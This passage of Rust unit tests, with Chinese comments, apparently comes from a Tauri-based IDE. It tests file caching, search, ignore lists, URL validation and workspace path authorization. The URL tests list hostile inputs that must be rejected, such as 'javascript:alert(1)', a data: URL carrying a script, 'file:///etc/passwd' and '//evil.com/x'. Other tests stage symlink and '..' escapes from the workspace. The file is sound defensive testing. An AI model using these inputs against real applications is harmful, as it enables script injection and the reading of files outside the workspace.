        assert!(a.exists && a.is_file, "应存在且是文件");
        assert_eq!(a.len, 11);
        assert!(a.mtime_ms.is_some(), "应给出 mtime");
        let b = tauri::async_runtime::block_on(file_probe_impl(p, &registry)).unwrap();
        assert_eq!((b.len, b.mtime_ms), (a.len, a.mtime_ms), "未改动时探针稳定");

        // 不存在 → exists=false（不是 Err：与 fs_path_exists 同口径）
        let missing = tauri::async_runtime::block_on(file_probe_impl(
            dir.join("no-such.txt").to_str().unwrap(),
            &registry,
        ))
        .unwrap();
        assert!(!missing.exists);

        // 读穿缓存：第一次 miss 读盘并回填，第二次命中（内容一致）
        let t1 = tauri::async_runtime::block_on(read_file_content_impl(
            p,
            false,
            &registry,
            Some(&cache),
        ))
        .unwrap();
        assert_eq!(t1, "hello probe");
        let t2 = tauri::async_runtime::block_on(read_file_content_impl(
            p,
            false,
            &registry,
            Some(&cache),
        ))
        .unwrap();
        assert_eq!(t2, "hello probe");

        // 写后旧缓存失效：读到新内容（等长改写，不依赖 mtime 粒度）
        tauri::async_runtime::block_on(super::write_file_content_impl(
            p,
            "hello proBE".to_string(),
            None,
            &registry,
            Some(&cache),
        ))
        .unwrap();
        let t3 = tauri::async_runtime::block_on(read_file_content_impl(
            p,
            false,
            &registry,
            Some(&cache),
        ))
        .unwrap();
        assert_eq!(t3, "hello proBE", "写后必须读到新内容，不能命中旧缓存");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn base64_encode_matches_rfc_vectors() {
        // RFC 4648 标准向量 + 填充边界（1/2/3 字节）
        assert_eq!(base64_encode(b""), "");
        assert_eq!(base64_encode(b"f"), "Zg==");
        assert_eq!(base64_encode(b"fo"), "Zm8=");
        assert_eq!(base64_encode(b"foo"), "Zm9v");
        assert_eq!(base64_encode(b"foobar"), "Zm9vYmFy");
        assert_eq!(base64_encode(&[0xff, 0xfe, 0x00, 0x01]), "//4AAQ==");
    }

    #[test]
    fn ignore_list_is_type_sensitive() {
        // 默认配置下：.git, .idea, node_modules, .venv, __pycache__, .DS_Store 被忽略
        for n in [
            ".git",
            ".idea",
            "node_modules",
            ".venv",
            "__pycache__",
            ".DS_Store",
        ] {
            assert!(is_ignored_entry(n, true, None), "目录 {n} 默认应被忽略");
        }
        for n in ["env", "build", "dist", "target", "vendor", "src"] {
            assert!(
                !is_ignored_entry(n, true, None),
                "源码目录 {n} 默认不应被忽略"
            );
        }
        // 用户自定义排除时：自定义生效，未在列表里的（如从列表中删除了 .idea）不再忽略
        let custom = vec![".git".to_string(), "dist".to_string(), "*.pyc".to_string()];
        assert!(is_ignored_entry(".git", true, Some(&custom)));
        assert!(is_ignored_entry("dist", true, Some(&custom)));
        assert!(is_ignored_entry("test.pyc", false, Some(&custom)));
        assert!(!is_ignored_entry(".idea", true, Some(&custom)));
        assert!(!is_ignored_entry("src", true, Some(&custom)));
    }
    #[test]
    fn image_mime_whitelist_rejects_executables() {
        use std::path::Path;
        assert_eq!(image_mime_for(Path::new("a.png")), Some("image/png"));
        assert_eq!(image_mime_for(Path::new("a.JPG")), Some("image/jpeg"));
        assert_eq!(image_mime_for(Path::new("a.Svg")), Some("image/svg+xml"));
        for p in ["a.exe", "a.sh", "a", "a.png.exe", "a.txt", ".png"] {
            assert_eq!(image_mime_for(Path::new(p)), None, "{p} 必须被拒绝");
        }
    }
}

#[cfg(test)]
mod external_url_tests {
    use super::{navigation_policy, validate_external_url, NavigationDecision};

    #[test]
    fn accepts_http_and_https_variants() {
        for u in [
            "https://example.com",
            "http://example.com/path?q=1#frag",
            "HTTPS://EXAMPLE.COM/UPPER",
            "Http://localhost:5173/",
            "https://user:pass@host:8443/a b"
                .replace(' ', "%20")
                .as_str(),
            "  https://example.com/padded  ",
        ] {
            assert!(validate_external_url(u).is_ok(), "{u} 应被放行");
        }
        assert_eq!(
            validate_external_url("  https://example.com/x  ").unwrap(),
            "https://example.com/x",
            "首尾空白应被归一化"
        );
    }

    #[test]
    fn rejects_dangerous_schemes() {
        for u in [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "file:///etc/passwd",
            "file://localhost/etc/passwd",
            "mailto:user@example.com",
            "vbscript:msgbox(1)",
            // 无斜杠的 scheme 相对形：解析器差异探针
            "https:evil.com",
            "http:foo",
            // 协议相对：没有 scheme，浏览器按当前页补 —— 在 webview 里语义危险
            "//evil.com/x",
            "",
            "   ",
            "https://",
            "https:///path-only",
            "https://?q=1",
            // 空白与控制字符
            "https://exam ple.com/",
            "https://example.com/a\njavascript:alert(1)",
            "\0https://example.com/",
        ] {
            let err = validate_external_url(u).unwrap_err();
            assert!(
                err.starts_with("ERR:external_url_rejected|"),
                "{u:?} 应被拒绝且走协议码，实际 {err}"
            );
        }
        // 超长直接拒绝，不进浏览器
        let long = format!("https://example.com/{}", "a".repeat(9000));
        assert!(validate_external_url(&long).is_err(), "超长 URL 应被拒绝");
    }

    #[test]
    fn navigation_policy_splits_local_external_other() {
        use NavigationDecision::*;
        // 本地文档放行（含 dev 服务器与内部伪协议）。asset 协议已移除，
        // data:/blob: 不允许作为顶层导航目标。
        for u in [
            "https://ipc.localhost/cb",
            "http://localhost:5173/",
            "http://127.0.0.1:5173/",
            "tauri://localhost/",
            "ipc://localhost/cb",
            "about:blank",
        ] {
            assert_eq!(navigation_policy(u), Allow, "{u} 应放行");
        }
        for u in [
            "asset://localhost/index.html",
            "data:text/plain,hi",
            "blob:https://asset.localhost/uuid",
        ] {
            assert_eq!(navigation_policy(u), Block, "{u} 应被拦截");
        }
        // 外部 http(s) 交系统浏览器，webview 内禁止
        for u in [
            "https://github.com/a/b",
            "http://example.com/",
            "HTTPS://EXAMPLE.COM/",
            "https://asset.localhost/index.html",
            "http://asset.localhost/index.html",
        ] {
            assert_eq!(navigation_policy(u), OpenExternally, "{u} 应送外部浏览器");
        }
        // 其余 scheme 直接拦
        for u in [
            "file:///etc/passwd",
            "mailto:a@b.c",
            "javascript:alert(1)",
            "datax:foo",
            "about:config",
            "custom-scheme://open",
        ] {
            assert_eq!(navigation_policy(u), Block, "{u} 应被拦截");
        }
    }
}

#[cfg(test)]
mod search_tests {
    use super::*;

    /// 每个测试独立的临时目录（纳秒时间戳，后缀测试名防并行碰撞）。
    fn temp_dir(tag: &str) -> PathBuf {
        let base = std::env::temp_dir().join(format!(
            "ide_search_test_{}_{}_{}",
            tag,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        base
    }

    fn write(dir: &Path, rel: &str, content: &str) -> PathBuf {
        let p = dir.join(rel);
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&p, content).unwrap();
        p
    }

    /// 模糊排序：`app` 必须把 `App.tsx` 排在 `xapplicationzz.rs` 之前，
    /// 且 `map.txt`（凑不出 a-p-p 三字母）不得出现。
    ///
    /// 旧 `contains` 实现是遍历序、无排序 —— 这条锁住新语义。
    #[test]
    fn fuzzy_ranking_prefers_name_match() {
        let dir = temp_dir("fuzzy");
        write(&dir, "App.tsx", "x");
        write(&dir, "xapplicationzz.rs", "x");
        write(&dir, "map.txt", "x");

        let hits = search_files_impl(&dir, "app", 50);
        let names: Vec<&str> = hits.iter().map(|h| h.name.as_str()).collect();
        assert!(
            names.contains(&"App.tsx"),
            "App.tsx 应命中，实际: {names:?}"
        );
        assert!(
            names.contains(&"xapplicationzz.rs"),
            "子序列匹配应命中，实际: {names:?}"
        );
        assert!(
            !names.contains(&"map.txt"),
            "凑不出子序列的不应命中，实际: {names:?}"
        );
        let pos_app = names.iter().position(|n| *n == "App.tsx").unwrap();
        let pos_xapp = names
            .iter()
            .position(|n| *n == "xapplicationzz.rs")
            .unwrap();
        assert!(
            pos_app < pos_xapp,
            "名前缀命中应排在词中命中之前，实际: {names:?}"
        );
        let _ = fs::remove_dir_all(&dir);
    }

    /// 空查询保持旧语义：只返回文件（目录不进结果），数量受 limit 截断。
    #[test]
    fn empty_query_returns_files_only() {
        let dir = temp_dir("emptyq");
        write(&dir, "a.txt", "x");
        write(&dir, "b.txt", "x");
        write(&dir, "sub/c.txt", "x");

        let hits = search_files_impl(&dir, "", 50);
        assert!(!hits.is_empty(), "空查询应返回文件");
        assert!(
            hits.iter().all(|h| !h.is_directory),
            "空查询不得返回目录: {hits:?}"
        );
        let limited = search_files_impl(&dir, "", 1);
        assert_eq!(limited.len(), 1, "limit 应截断");
        let _ = fs::remove_dir_all(&dir);
    }

    /// `.gitignore` 生效（Zed worktree 语义）：非 git 目录也生效
    ///（`require_git(false)`），命中规则的文件名与内容都搜不到。
    #[test]
    fn gitignore_is_respected_by_name_and_content_search() {
        let dir = temp_dir("gi");
        fs::write(dir.join(".gitignore"), "*.log\nignored_dir/\n").unwrap();
        write(&dir, "keep.rs", "needle here");
        write(&dir, "skip.log", "needle here");
        write(&dir, "ignored_dir/a.rs", "needle here");

        let names: Vec<String> = search_files_impl(&dir, "keep", 50)
            .into_iter()
            .map(|h| h.name)
            .collect();
        assert!(names.contains(&"keep.rs".to_string()), "未忽略文件应搜到");
        let skipped: Vec<String> = search_files_impl(&dir, "skip", 50)
            .into_iter()
            .map(|h| h.name)
            .collect();
        assert!(
            !skipped.contains(&"skip.log".to_string()),
            ".gitignore 命中的文件名不应搜到: {skipped:?}"
        );

        let mut results = Vec::new();
        search_dir_internal(&dir, "needle", false, &mut results, 100);
        let hit_files: Vec<String> = results.iter().map(|r| r.file_path.clone()).collect();
        assert_eq!(
            hit_files.len(),
            1,
            "只有 keep.rs 应命中，实际: {hit_files:?}"
        );
        assert!(hit_files[0].ends_with("keep.rs"), "命中应来自 keep.rs");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 硬忽略表托底：没有 .gitignore 时 node_modules 也不进搜索。
    #[test]
    fn hardcoded_ignore_backstops_missing_gitignore() {
        let dir = temp_dir("hardignore");
        write(&dir, "node_modules/dep/index.js", "needle");
        write(&dir, "src/main.rs", "needle");

        let names: Vec<String> = search_files_impl(&dir, "index", 50)
            .into_iter()
            .map(|h| h.path)
            .collect();
        assert!(
            names.iter().all(|p| !p.contains("node_modules")),
            "node_modules 不应进文件名搜索: {names:?}"
        );
        let mut results = Vec::new();
        search_dir_internal(&dir, "needle", false, &mut results, 100);
        assert!(
            results
                .iter()
                .all(|r| !r.file_path.contains("node_modules")),
            "node_modules 不应进内容搜索"
        );
        assert!(
            results.iter().any(|r| r.file_path.ends_with("main.rs")),
            "正常文件应命中"
        );
        let _ = fs::remove_dir_all(&dir);
    }

    /// limit 生效 + 同库同查询永远同序（分数/路径双键排序的确定性）。
    #[test]
    fn limit_and_deterministic_order() {
        let dir = temp_dir("det");
        for i in 0..20 {
            write(&dir, &format!("file_{i:02}.rs"), "x");
        }
        let a = search_files_impl(&dir, "file", 5);
        let b = search_files_impl(&dir, "file", 5);
        assert_eq!(a.len(), 5, "limit=5 应截断");
        let pa: Vec<&str> = a.iter().map(|h| h.path.as_str()).collect();
        let pb: Vec<&str> = b.iter().map(|h| h.path.as_str()).collect();
        assert_eq!(pa, pb, "两次同查询结果序必须一致");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 内容搜索基本盘（重写回归网）：行号/内容/偏移正确，大小写不敏感。
    #[test]
    fn content_search_finds_line_with_offsets() {
        let dir = temp_dir("content");
        write(&dir, "a.txt", "hello\n  Needle HERE  \nbye\n");

        let mut results = Vec::new();
        search_dir_internal(&dir, "needle", false, &mut results, 100);
        assert_eq!(results.len(), 1, "应命中一行，实际: {results:?}");
        let hit = &results[0];
        assert_eq!(hit.line_number, 2, "行号从 1 起");
        assert_eq!(hit.line_content, "Needle HERE", "内容去首尾空白");
        // 偏移相对**原行**（含前导空白），不是 trim 后的预览串
        let raw_line = "  Needle HERE  ";
        assert_eq!(
            &raw_line[hit.match_start..hit.match_end].to_lowercase(),
            "needle"
        );

        // 大小写敏感模式：小写 needle 不应命中大写行
        let mut strict = Vec::new();
        search_dir_internal(&dir, "needle", true, &mut strict, 100);
        assert!(strict.is_empty(), "大小写敏感不应命中");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 匹配命中的目录也进文件名结果（旧实现行为，保持）。
    #[test]
    fn matching_directory_is_returned() {
        let dir = temp_dir("dirhit");
        write(&dir, "my_dir/inner.txt", "x");

        let hits = search_files_impl(&dir, "my_dir", 50);
        assert!(
            hits.iter().any(|h| h.is_directory && h.name == "my_dir"),
            "命中的目录应进结果: {hits:?}"
        );
        let _ = fs::remove_dir_all(&dir);
    }

    /// 安全回归：悬空软链指向工作区外时，canonicalize 会失败，旧实现只
    /// 规范化父目录就把链接名拼回去，authorize 误判为工作区内；随后 write
    /// 会顺着链接在区外创建文件。必须拒绝含软链的未解析尾段。
    #[cfg(unix)]
    #[test]
    fn authorize_rejects_dangling_symlink_outside_workspace() {
        let root = temp_dir("auth_symlink_root");
        let outside = temp_dir("auth_symlink_outside");
        let reg = WorkspaceRegistry::default();
        register_workspace_dir(&reg, &root.to_string_lossy(), false).unwrap();

        // 目标文件不存在 => canonicalize(link) 失败，走「待创建」分支
        let target = outside.join("created_by_escape.txt");
        let link = root.join("escape.txt");
        std::os::unix::fs::symlink(&target, &link).unwrap();

        let err = authorize_workspace_path(&reg, &link.to_string_lossy(), true)
            .expect_err("悬空软链不能被当作工作区内路径");
        assert_eq!(
            crate::error_proto::parse_error(&err).code(),
            Some("path_outside_workspace"),
            "应返回越界错误码，实际: {err}"
        );
        assert!(!target.exists(), "授权阶段不能创建区外文件");

        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_dir_all(&outside);
    }

    /// 未解析路径中的 `..` 不能被 file_name() 静默丢弃后按别处校验。
    #[test]
    fn authorize_rejects_unresolved_parent_dir() {
        let root = temp_dir("auth_dotdot_root");
        let reg = WorkspaceRegistry::default();
        register_workspace_dir(&reg, &root.to_string_lossy(), false).unwrap();
        let escape = root.join("..").join("outside_new.txt");
        let err = authorize_workspace_path(&reg, &escape.to_string_lossy(), true)
            .expect_err("未解析的 .. 路径必须拒绝");
        assert_eq!(
            crate::error_proto::parse_error(&err).code(),
            Some("path_outside_workspace"),
            "应返回越界错误码，实际: {err}"
        );
        let _ = fs::remove_dir_all(&root);
    }
}
